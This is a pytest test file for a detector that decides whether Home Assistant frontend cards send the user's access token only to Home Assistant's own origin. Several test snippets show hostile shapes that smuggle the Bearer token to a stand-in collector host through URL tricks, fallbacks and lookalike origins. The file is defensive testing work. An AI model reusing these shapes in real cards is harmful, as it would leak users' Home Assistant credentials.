"""(0.15) A login token sent to Home Assistant itself is not theft (js_wrapper.ha_origin).

Four of 600 real cards were read as stealing the token: the URL was HA's own origin,
built in ways the rule can't follow in minified code. The shapes below are those cases
with the names changed; the rest are ways a hostile card could try to slip through.
"""

import itertools
import time

import pytest

from sniff_test.analyzers.js_wrapper import _url_arg, ha_origin


def _check(code: str, fn: tuple[int, int, str] | None = None) -> bool:
    """The URL argument of the last fetch( in `code`, checked at its own offset."""
    at = code.rindex("fetch(")
    end = code.index(")", code.index("{", at)) + 1 if "{" in code[at:] else len(code)
    span = _url_arg(code, at, end)
    assert span is not None
    return ha_origin(code, code[span[0] : span[1]].strip(), span[0], fn)


@pytest.mark.parametrize(
    "code",
    [
        # an upload to HA: the address from the connection, hassUrl() or the page
        'async function up(e,n){const a=e.connection&&"string"==typeof e.connection.options.url'
        '?e.connection.options.url.replace(/^ws/,"http"):"function"==typeof e.hassUrl?e.hassUrl()'
        ':`${window.location.protocol}//${window.location.host}`;const o=`${a.replace(/\\/$/,"")}'
        '/api/image/upload`;const t=await fetch(o,{method:"POST",headers:{Authorization:`Bearer '
        "${e.auth.data.access_token}`},body:n})}",
        # HA's configured addresses, or the page's own
        "function load(hass){const baseUrl = hass.config.external_url || hass.config.internal_url"
        " || window.location.origin; return fetch(`${baseUrl}/api/acme/rules`, {headers: {"
        "Authorization: `Bearer ${hass.auth.data.access_token}`}})}",
        "fetch(`${window.location.protocol}//${window.location.host}/api/x`, {headers: h})",
        "fetch(location.protocol + '//' + location.host + '/api/x', {headers: h})",
        "fetch(window.location.origin + '/api/x', {headers: h})",
        'fetch(cond ? "/api/a" : "/api/b", {headers: h})',
        'fetch("", {headers: h})',
    ],
)
def test_home_assistants_own_address_is_proven(code):
    assert _check(code)


@pytest.mark.parametrize(
    "code",
    [
        # something that isn't a path follows the origin: it can move the host
        "fetch(`${window.location.origin}${u}`, {headers: h})",
        "fetch(window.location.origin + u, {headers: h})",
        "fetch(location.origin + '@collect.example.invalid/x', {headers: h})",
        # one way of building it leaves HA
        'fetch(c ? "/api/x" : "https://collect.example.invalid/c", {headers: h})',
        'fetch(a || "https://collect.example.invalid/c", {headers: h})',
        # a name given two values, or held in a block that closed before the use
        "let o=location.origin;o=u;fetch(o,{headers:h})",
        "{const o=location.origin}fetch(o,{headers:h})",
        # a name never given a value here
        "fetch(o,{headers:h})",
        # a lookalike: another object's origin
        "fetch(evil.origin + '/x', {headers: h})",
        "fetch(`${loc.origin}/x`, {headers: h})",
    ],
)
def test_anything_else_keeps_the_finding(code):
    assert not _check(code)


def test_a_parameter_of_the_same_name_shadows_an_earlier_value():
    code = "const o=location.origin;function send(o){return fetch(o,{headers:h})}"
    fn_start = code.index("function")
    assert not _check(code, (fn_start, len(code), "o"))
    code = "const o=location.origin;const send=o=>fetch(o,{headers:h})"
    assert not _check(code)


def test_the_camera_proxy_token_goes_to_ha_as_an_image_source():
    code = (
        'const t=s.attributes.access_token;const m=cam&&t?"/api/camera_proxy_stream/"+id+'
        '"?token="+encodeURIComponent(t):"";img.src=m'
    )
    at = code.rindex("img.src")
    span = _url_arg(code, at, len(code))
    assert span is not None and ha_origin(code, code[span[0] :].strip(), span[0], None)


@pytest.mark.parametrize(
    "hostile",
    [
        "(" * 200_000,
        "a?" * 100_000 + "b",
        "`${" * 100_000,
        "o=" * 100_000,
        "location.origin+" * 50_000,
    ],
)
def test_hostile_text_stays_fast(hostile):
    code = hostile + "fetch(o,{headers:h})"
    t0 = time.perf_counter()
    span = _url_arg(code, code.rindex("fetch("), len(code))
    assert span is not None
    ha_origin(code, code[span[0] : span[1]], span[0], None)
    assert time.perf_counter() - t0 < 1.0


def test_a_long_chain_of_names_gives_up_quickly():
    names = [f"v{i}" for i in range(400)]
    code = "const v0=location.origin;" + "".join(
        f"const {b}={a}||{a};" for a, b in itertools.pairwise(names)
    )
    code += f"fetch({names[-1]},{{headers:h}})"
    t0 = time.perf_counter()
    assert not _check(code)  # too long to prove: the finding stays
    assert time.perf_counter() - t0 < 1.0
